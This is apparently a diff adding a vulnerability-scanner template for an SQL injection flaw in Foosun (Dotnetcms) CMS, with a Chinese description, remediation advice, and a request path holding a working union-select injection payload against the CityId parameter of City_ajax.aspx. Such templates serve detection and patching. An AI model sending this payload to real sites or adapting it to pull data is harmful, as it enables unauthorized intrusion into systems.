@@ -1,0 +1,29 @@
+id: Dotnetcms-SQLi
+info:
+  name: Dotnetcms SQLi
+  author:
+  - l0ne1y
+  description: |-
+    Foosun cms .net版本 City_ajax.aspx 参数 id SQL注入漏洞
+    Foosun CMS是一款内容管理系统。
+
+    Foosun（风讯）CMS SQL注入漏洞存在于City_ajax.aspx 页面，该页面存在SQL注入，导致攻击者可以利用漏洞以当前用户权限发起SQL注入攻击，攻击者可以修改任意表中的数据或执行其他注入操作。
+  severity: high
+  remediation: |-
+    官方修复建议
+    建议更新到官方最新版本，地址为 https://www.foosun.net/
+
+    临时修复方案：<br />1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。<br />2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。<br />3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。<br />4、数据长度应该严格规定，能在一定程度上防止比较长的SQL注入语句无法正确执行。
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - '{{md5(''{{randstr}}'')}}'
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/user/City_ajax.aspx?CityId=99''union%20select%20sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''{{randstr}}'')),2--'
+  method: GET
